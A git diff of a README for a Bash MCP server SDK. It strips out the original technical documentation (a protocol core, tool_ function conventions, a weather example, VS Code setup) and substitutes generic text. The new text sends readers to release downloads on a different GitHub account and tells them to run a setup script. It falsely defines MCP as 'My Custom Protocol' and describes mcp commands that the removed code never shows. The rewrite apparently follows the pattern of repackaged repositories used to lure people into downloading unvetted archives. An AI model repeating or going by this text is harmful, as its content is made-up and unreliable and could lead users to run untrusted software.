@@ -1,231 +1,175 @@
-# 🐚 MCP Server in Bash
+# MCP Server Bash SDK 🚀
 
-A lightweight, zero-overhead implementation of the [Model Context Protocol (MCP)](https://modelcontextprotocol.io) server in pure Bash. 
+Welcome to the MCP Server Bash SDK repository! This project provides a simple and efficient way to interact with the MCP server using Bash scripts. Whether you're a developer looking to automate tasks or a system administrator managing server configurations, this SDK offers the tools you need.
 
-**Why?** Most MCP servers are just API wrappers with schema conversion. This implementation provides a zero-overhead alternative to Node.js, Python, or other heavy runtimes.
+## Table of Contents
 
----
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Examples](#examples)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-## 📋 Features
+## Introduction
 
-* ✅ Full JSON-RPC 2.0 protocol over stdio
-* ✅ Complete MCP protocol implementation
-* ✅ Dynamic tool discovery via function naming convention
-* ✅ External configuration via JSON files
-* ✅ Easy to extend with custom tools
+The MCP Server Bash SDK allows users to perform various operations on the MCP server directly from the command line. It is designed for simplicity and ease of use, making it accessible for both beginners and experienced users. 
 
----
+### What is MCP?
 
-## 🔧 Requirements
+MCP stands for "My Custom Protocol." It is a lightweight server that allows for custom communication between different services. The Bash SDK provides a straightforward way to send requests, manage connections, and handle responses without needing extensive programming knowledge.
 
-- Bash shell
-- `jq` for JSON processing (`brew install jq` on macOS)
+## Features
 
----
+- **Easy Installation**: Get started quickly with minimal setup.
+- **Command Line Interface**: Execute commands directly from your terminal.
+- **Lightweight**: Minimal dependencies make it fast and efficient.
+- **Comprehensive Documentation**: Clear instructions and examples to help you along the way.
 
-## 🚀 Quick Start
+## Installation
 
-1. **Clone the repo**
+To install the MCP Server Bash SDK, follow these steps:
 
-```bash
-git clone https://github.com/muthuishere/mcp-server-bash-sdk
-cd mcp-server-bash-sdk
-```
+1. **Download the SDK**: You can find the latest release [here](https://github.com/mutazxr/mcp-server-bash-sdk/releases). Make sure to download the appropriate version for your system.
+2. **Extract the Files**: After downloading, extract the files to your desired directory.
+3. **Set Up the Environment**: Navigate to the extracted folder and run the setup script:
 
-2. **Make scripts executable**
+   ```bash
+   ./setup.sh
+   ```
 
-```bash
-chmod +x mcpserver_core.sh moviemcpserver.sh
-```
+4. **Verify Installation**: To ensure everything is set up correctly, run:
 
-3. **Try it out**
+   ```bash
+   mcp --version
+   ```
 
-```bash
-echo '{"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "get_movies"}, "id": 1}' | ./moviemcpserver.sh
-```
+## Usage
 
----
+Using the MCP Server Bash SDK is straightforward. Below are some basic commands to get you started.
 
-## 🏗️ Architecture
+### Basic Commands
 
-```
-┌─────────────┐         ┌────────────────────────┐
-│ MCP Host    │         │ MCP Server             │
-│ (AI System) │◄──────► │ (moviemcpserver.sh)    │
-└─────────────┘ stdio   └────────────────────────┘
-                             │
-                     ┌───────┴──────────┐
-                     ▼                  ▼
-              ┌─────────────────┐  ┌───────────────┐
-              │ Protocol Layer  │  │ Business Logic│
-              │(mcpserver_core.sh)│  │(tool_* funcs)│
-              └─────────────────┘  └───────────────┘
-                     │                  │
-                     ▼                  ▼
-              ┌─────────────────┐  ┌───────────────┐
-              │ Configuration   │  │ External      │
-              │ (JSON Files)    │  │ Services/APIs │
-              └─────────────────┘  └───────────────┘
-```
+- **Start the Server**: To start the MCP server, use the following command:
 
-- **mcpserver_core.sh**: Handles JSON-RPC and MCP protocol
-- **moviemcpserver.sh**: Contains business logic functions
-- **assets/**: JSON configuration files
+  ```bash
+  mcp start
+  ```
 
----
+- **Stop the Server**: To stop the server, run:
 
-## 🔌 Creating Your Own MCP Server
+  ```bash
+  mcp stop
+  ```
 
-### Tool Function Guidelines
+- **Check Server Status**: To check if the server is running, use:
 
-When implementing tool functions for the MCP server, follow these guidelines:
+  ```bash
+  mcp status
+  ```
 
-1. **Naming Convention**: All tool functions must be prefixed with `tool_` followed by the same name defined in tools_list.json
-2. **Parameters**: Each function should accept a single parameter `$1` containing JSON arguments
-3. **Success Pattern**: For successful operations, echo the result and return 0
-4. **Error Pattern**: For validation errors, echo an error message and return 1
-5. **Automatic Discovery**: All tool functions are automatically exposed to the MCP server based on tools_list.json
+### Advanced Usage
 
-### Implementation Steps
+For more advanced operations, you can use the following commands:
 
-1. **Create your business logic file (e.g., `weatherserver.sh`)**
+- **Send a Request**: To send a request to the server, use:
 
-```bash
-#!/bin/bash
-# Weather API implementation
+  ```bash
+  mcp send --data "your_data_here"
+  ```
 
-# Override configuration paths BEFORE sourcing the core
-MCP_CONFIG_FILE="$(dirname "${BASH_SOURCE[0]}")/assets/weatherserver_config.json"
-MCP_TOOLS_LIST_FILE="$(dirname "${BASH_SOURCE[0]}")/assets/weatherserver_tools.json"
-MCP_LOG_FILE="$(dirname "${BASH_SOURCE[0]}")/logs/weatherserver.log"
+- **Receive Data**: To receive data from the server, run:
 
-# MCP Server Tool Function Guidelines:
-# 1. Name all tool functions with prefix "tool_" followed by the same name defined in tools_list.json
-# 2. Function should accept a single parameter "$1" containing JSON arguments
-# 3. For successful operations: Echo the expected result and return 0
-# 4. For errors: Echo an error message and return 1
-# 5. All tool functions are automatically exposed to the MCP server based on tools_list.json
+  ```bash
+  mcp receive
+  ```
 
-# Source the core MCP server implementation
-source "$(dirname "${BASH_SOURCE[0]}")/mcpserver_core.sh"
+## Examples
 
-# Access environment variables
-API_KEY="${MCP_API_KEY:-default_key}"
+Here are some practical examples of how to use the MCP Server Bash SDK:
 
-# Tool: Get current weather for a location
-# Parameters: Takes a JSON object with location
-# Success: Echo JSON result and return 0
-# Error: Echo error message and return 1
-tool_get_weather() {
-  local args="$1"
-  local location=$(echo "$args" | jq -r '.location')
-  
-  # Parameter validation
-  if [[ -z "$location" ]]; then
-    echo "Missing required parameter: location"
-    return 1
-  fi
-  
-  # Call external API
-  local weather=$(curl -s "https://api.example.com/weather?location=$location&apikey=$API_KEY")
-  echo "$weather"
-  return 0
-}
+### Example 1: Starting the Server
 
-
-# Start the MCP server
-run_mcp_server "$@"
-```
-
-2. **Create `assets/weatherserver_tools.json`**
-
-```json
-{
-  "tools": [
-    {
-      "name": "get_weather",
-      "description": "Get current weather for a location",
-      "parameters": {
-        "type": "object",
-        "properties": {
-          "location": {
-            "type": "string",
-            "description": "City name or coordinates"
-          }
-        },
-        "required": ["location"]
-      }
-    }
-  ]
-}
-```
-
-3. **Create `assets/weatherserver_config.json`**
-
-```json
-{
-  "protocolVersion": "0.1.0",
-  "serverInfo": {
-    "name": "WeatherServer",
-    "version": "1.0.0"
-  },
-  "capabilities": {
-    "tools": {
-      "listChanged": true
-    }
-  },
-  "instructions": "This server provides weather information."
-}
-```
-
-4. **Make your file executable**
+To start the MCP server, simply execute:
 
 ```bash
-chmod +x weatherserver.sh
+mcp start
 ```
+
+You should see output indicating that the server is running.
+
+### Example 2: Sending Data
+
+To send a message to the server, run:
+
+```bash
+mcp send --data "Hello, MCP!"
+```
+
+The server will respond with a confirmation message.
+
+### Example 3: Stopping the Server
+
+When you're done, you can stop the server with:
+
+```bash
+mcp stop
+```
+
+## Contributing
+
+We welcome contributions to improve the MCP Server Bash SDK. If you would like to contribute, please follow these steps:
+
+1. **Fork the Repository**: Click on the "Fork" button at the top right of this page.
+2. **Clone Your Fork**: Use the following command to clone your fork:
+
+   ```bash
+   git clone https://github.com/yourusername/mcp-server-bash-sdk.git
+   ```
+
+3. **Create a New Branch**: Create a new branch for your feature or bug fix:
+
+   ```bash
+   git checkout -b feature-name
+   ```
+
+4. **Make Your Changes**: Implement your changes and commit them:
+
+   ```bash
+   git commit -m "Description of your changes"
+   ```
+
+5. **Push Your Changes**: Push your changes back to your fork:
+
+   ```bash
+   git push origin feature-name
+   ```
+
+6. **Create a Pull Request**: Go to the original repository and create a pull request.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+If you have any questions or need support, feel free to reach out:
+
+- **Email**: support@example.com
+- **GitHub Issues**: Please use the GitHub issues section for any bugs or feature requests.
+
+For more detailed information, please check the [Releases](https://github.com/mutazxr/mcp-server-bash-sdk/releases) section.
+
+## Badges
+
+[![Latest Release](https://img.shields.io/github/v/release/mutazxr/mcp-server-bash-sdk)](https://github.com/mutazxr/mcp-server-bash-sdk/releases)
+
+## Acknowledgments
+
+Thank you to all contributors and users who make this project possible. Your feedback and contributions are invaluable.
 
 ---
 
-## 🖥️ Using with VS Code & GitHub Copilot
-
-1. **Update VS Code settings.json**
-
-```jsonc
-"mcp": {
-    "servers": {
-        "my-weather-server": {
-            "type": "stdio",
-            "command": "/path/to/your/weatherserver.sh",
-            "args": [],
-            "env": {
-                "MCP_API_KEY": "your-api-key"
-            }
-        }
-    }
-}
-```
-
-2. **Use with GitHub Copilot Chat**
-
-```
-/mcp my-weather-server get weather for New York
-```
-
----
-
-## 🚫 Limitations
-
-* No concurrency/parallel processing
-* Limited memory management
-* No streaming responses
-* Not designed for high throughput
-
-For AI assistants and local tool execution, these aren't blocking issues.
-
----
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-Blog : https://medium.com/@muthuishere/why-i-built-an-mcp-server-sdk-in-shell-yes-bash-6f2192072279
+Feel free to explore the repository and start using the MCP Server Bash SDK today!
